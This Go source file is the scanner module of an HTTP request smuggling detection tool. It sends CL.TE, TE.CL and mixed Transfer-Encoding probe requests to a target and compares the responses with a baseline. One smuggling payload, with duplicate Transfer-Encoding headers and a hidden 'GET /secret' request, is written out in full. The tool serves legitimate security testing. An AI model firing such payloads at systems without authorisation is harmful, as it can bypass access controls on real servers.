package scanner

import (
	"fmt"
	"strings"

	"smuggler/internal/ai"
	"smuggler/internal/baseline"
	"smuggler/internal/detector"
	"smuggler/internal/models"
	"smuggler/internal/payload"
	"smuggler/internal/sender"
)

// Scanner orchestrates the entire HTTP request smuggling detection workflow.
type Scanner struct {
	target           string
	port             int
	sender           *sender.RawSender
	baselineManager  *baseline.Manager
	detector         *detector.Detector
	aiProvider       ai.Provider
	baselineResponse *models.HTTPResponse
	results          []*models.ScanResult
	report           *detector.DetectionReport
}

// NewScanner creates a new scanner for a target.
func NewScanner(target string, port int) *Scanner {
	s := sender.NewRawSender()

	return &Scanner{
		target:          target,
		port:            port,
		sender:          s,
		baselineManager: baseline.NewManager(s, target, port),
		detector:        detector.NewDetector(),
		results:         make([]*models.ScanResult, 0),
	}
}

// SetConfidenceThreshold sets the detector's confidence threshold.
func (sc *Scanner) SetConfidenceThreshold(threshold float64) *Scanner {
	sc.detector.SetConfidenceThreshold(threshold)
	return sc
}

// SetTLS enables or disables TLS/HTTPS for connections.
func (sc *Scanner) SetTLS(useTLS bool) *Scanner {
	sc.sender.SetTLS(useTLS)
	return sc
}

// SetInsecureTLS allows insecure TLS connections (skip certificate verification).
func (sc *Scanner) SetInsecureTLS(insecure bool) *Scanner {
	sc.sender.SetInsecureTLS(insecure)
	return sc
}

// SetAIAnalyzer sets an AI analyzer for intelligent response analysis.
func (sc *Scanner) SetAIAnalyzer(analyzer *ai.AIAnalyzer) *Scanner {
	sc.aiProvider = analyzer
	return sc
}

// SetAIProvider sets an AI provider (OpenAI, Ollama, etc.) for intelligent response analysis.
func (sc *Scanner) SetAIProvider(provider ai.Provider) *Scanner {
	sc.aiProvider = provider
	return sc
}

// CaptureBaseline sends a normal request to establish baseline behavior.
func (sc *Scanner) CaptureBaseline() error {
	fmt.Printf("[*] Capturing baseline response for %s:%d\n", sc.target, sc.port)

	resp, err := sc.baselineManager.CaptureBaseline()
	if err != nil {
		return fmt.Errorf("baseline capture failed: %w", err)
	}

	sc.baselineResponse = resp
	fmt.Printf("    Status: %d | Timing: %d ms | Headers: %d | Body: %d bytes\n",
		resp.StatusCode, resp.TimingMS, len(resp.Headers), len(resp.Body))

	return nil
}

// TestCLTE tests for CL.TE vulnerability.
func (sc *Scanner) TestCLTE() error {
	if sc.baselineResponse == nil {
		return fmt.Errorf("baseline not captured; call CaptureBaseline first")
	}

	fmt.Printf("\n[*] Testing CL.TE (Content-Length / Transfer-Encoding)...\n")

	gen := payload.NewGenerator(sc.target, sc.port)
	gen.SetPath("/")
	gen.AddHeader("Connection", "close")

	payloadStr, err := gen.GenerateCLTEPayload("GET /admin HTTP/1.1\r\nHost: " + sc.target + "\r\n\r\n")
	if err != nil {
		return fmt.Errorf("CL.TE payload generation failed: %w", err)
	}

	targetAddr := fmt.Sprintf("%s:%d", sc.target, sc.port)
	testResp, err := sc.sender.SendRequest(targetAddr, payloadStr)
	if err != nil {
		return fmt.Errorf("CL.TE test send failed: %w", err)
	}

	fmt.Printf("    Response: %d | Timing: %d ms\n", testResp.StatusCode, testResp.TimingMS)

	comparison := sc.baselineManager.CompareResponses(sc.baselineResponse, testResp)
	result := sc.detector.AnalyzeCLTE(sc.target, comparison)
	sc.results = append(sc.results, result)

	fmt.Printf("    Result: %s\n", func() string {
		if result.Suspicious {
			return "SUSPICIOUS ✗"
		}
		return "CLEAN ✓"
	}())

	return nil
}

// TestTECL tests for TE.CL vulnerability.
func (sc *Scanner) TestTECL() error {
	if sc.baselineResponse == nil {
		return fmt.Errorf("baseline not captured; call CaptureBaseline first")
	}

	fmt.Printf("\n[*] Testing TE.CL (Transfer-Encoding / Content-Length)...\n")

	gen := payload.NewGenerator(sc.target, sc.port)
	gen.SetPath("/")
	gen.AddHeader("Connection", "close")

	payloadStr, err := gen.GenerateTECLPayload("GET /api HTTP/1.1\r\nHost: " + sc.target + "\r\n\r\n")
	if err != nil {
		return fmt.Errorf("TE.CL payload generation failed: %w", err)
	}

	targetAddr := fmt.Sprintf("%s:%d", sc.target, sc.port)
	testResp, err := sc.sender.SendRequest(targetAddr, payloadStr)
	if err != nil {
		return fmt.Errorf("TE.CL test send failed: %w", err)
	}

	fmt.Printf("    Response: %d | Timing: %d ms\n", testResp.StatusCode, testResp.TimingMS)

	comparison := sc.baselineManager.CompareResponses(sc.baselineResponse, testResp)
	result := sc.detector.AnalyzeTECL(sc.target, comparison)
	sc.results = append(sc.results, result)

	fmt.Printf("    Result: %s\n", func() string {
		if result.Suspicious {
			return "SUSPICIOUS ✗"
		}
		return "CLEAN ✓"
	}())

	return nil
}

// TestMixedTE tests for Mixed Transfer-Encoding header exploitation.
func (sc *Scanner) TestMixedTE() error {
	if sc.baselineResponse == nil {
		return fmt.Errorf("baseline not captured; call CaptureBaseline first")
	}

	fmt.Printf("\n[*] Testing Mixed-TE (Multiple Transfer-Encoding headers)...\n")

	payloadStr := fmt.Sprintf(
		"GET / HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\n"+
			"Transfer-Encoding: identity\r\n"+
			"Transfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n"+
			"0\r\n\r\nGET /secret HTTP/1.1\r\nHost: %s\r\n\r\n",
		sc.target, sc.port, sc.target)

	targetAddr := fmt.Sprintf("%s:%d", sc.target, sc.port)
	testResp, err := sc.sender.SendRequest(targetAddr, payloadStr)
	if err != nil {
		return fmt.Errorf("Mixed-TE test send failed: %w", err)
	}

	fmt.Printf("    Response: %d | Timing: %d ms\n", testResp.StatusCode, testResp.TimingMS)

	comparison := sc.baselineManager.CompareResponses(sc.baselineResponse, testResp)
	result := sc.detector.AnalyzeMixedTE(sc.target, comparison)
	sc.results = append(sc.results, result)

	fmt.Printf("    Result: %s\n", func() string {
		if result.Suspicious {
			return "SUSPICIOUS ✗"
		}
		return "CLEAN ✓"
	}())

	return nil
}

// Run executes the full scanning workflow.
func (sc *Scanner) Run() error {
	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	fmt.Printf("HTTP REQUEST SMUGGLING SCANNER\n")
	fmt.Printf("Target: %s:%d\n", sc.target, sc.port)
	fmt.Printf("%s\n\n", strings.Repeat("=", 60))

	if err := sc.CaptureBaseline(); err != nil {
		return err
	}

	if err := sc.TestCLTE(); err != nil {
		return err
	}

	if err := sc.TestTECL(); err != nil {
		return err
	}

	if err := sc.TestMixedTE(); err != nil {
		return err
	}

	sc.generateFinalReport()

	return nil
}

// generateFinalReport creates and stores the detection report.
func (sc *Scanner) generateFinalReport() {
	sc.report = sc.detector.GenerateReport(sc.target, sc.results...)
}

// PrintReport prints the final detection report to stdout.
func (sc *Scanner) PrintReport() {
	if sc.report == nil {
		fmt.Println("[!] No report available. Run the scanner first.")
		return
	}

	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	fmt.Print(sc.report.String())
	fmt.Printf("%s\n", strings.Repeat("=", 60))
}

// GetResults returns the raw scan results.
func (sc *Scanner) GetResults() []*models.ScanResult {
	return sc.results
}

// GetReport returns the detection report.
func (sc *Scanner) GetReport() *detector.DetectionReport {
	return sc.report
}

// IsVulnerable returns true if any technique was detected as vulnerable.
func (sc *Scanner) IsVulnerable() bool {
	if sc.report == nil {
		return false
	}
	return sc.report.Vulnerable > 0
}

// GetMostLikelyTechnique returns the most likely vulnerability type.
func (sc *Scanner) GetMostLikelyTechnique() string {
	if sc.report == nil || sc.report.Vulnerable == 0 {
		return "None"
	}
	return sc.report.MostLikelyTechnique
}

// Summary returns a brief text summary of the scan.
func (sc *Scanner) Summary() string {
	if sc.report == nil {
		return "Scan not completed"
	}

	var summary strings.Builder
	summary.WriteString(fmt.Sprintf("Target: %s:%d\n", sc.target, sc.port))
	summary.WriteString(fmt.Sprintf("Tests run: %d\n", sc.report.TotalTests))
	summary.WriteString(fmt.Sprintf("Vulnerable: %d\n", sc.report.Vulnerable))

	if sc.report.Vulnerable > 0 {
		summary.WriteString(fmt.Sprintf("Most likely: %s\n", sc.report.MostLikelyTechnique))
		summary.WriteString("Status: VULNERABLE ✗\n")
	} else {
		summary.WriteString("Status: CLEAN ✓\n")
	}

	return summary.String()
}
